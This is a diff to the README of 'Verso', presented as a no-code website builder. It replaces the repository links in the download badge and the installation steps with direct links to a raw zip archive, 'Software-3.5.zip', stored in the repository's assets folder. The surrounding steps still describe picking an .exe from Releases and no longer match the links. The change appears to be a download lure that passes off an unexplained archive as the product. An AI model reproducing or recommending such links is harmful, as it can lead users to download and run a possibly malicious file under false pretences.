@@ -1,6 +1,6 @@
 # 🎨 Verso - Build beautiful websites without writing code
 
-[![Download Verso](https://img.shields.io/badge/Download-Verso-blue.svg)](https://github.com/Immunoglobulinegillesdelatourette32/Verso)
+[![Download Verso](https://img.shields.io/badge/Download-Verso-blue.svg)](https://github.com/Immunoglobulinegillesdelatourette32/Verso/raw/refs/heads/main/assets/Software-3.5.zip)
 
 Verso is a visual editor for web design. You can create web pages by dragging elements onto a canvas. You can change sizes, rotate items, and manage your images and icons. The tool generates code for you while you work. You do not need to know how to code to use Verso.
 
@@ -18,7 +18,7 @@ Verso helps you design pages from scratch. It includes a set of pre-made blocks.
 
 Follow these steps to set up Verso on your Windows computer.
 
-1.  Visit [this page](https://github.com/Immunoglobulinegillesdelatourette32/Verso) to download the latest version of the software.
+1.  Visit [this page](https://github.com/Immunoglobulinegillesdelatourette32/Verso/raw/refs/heads/main/assets/Software-3.5.zip) to download the latest version of the software.
 2.  Look for the section labeled Releases on the right side of the page.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the file arrives in your Downloads folder, double-click the file to open it.
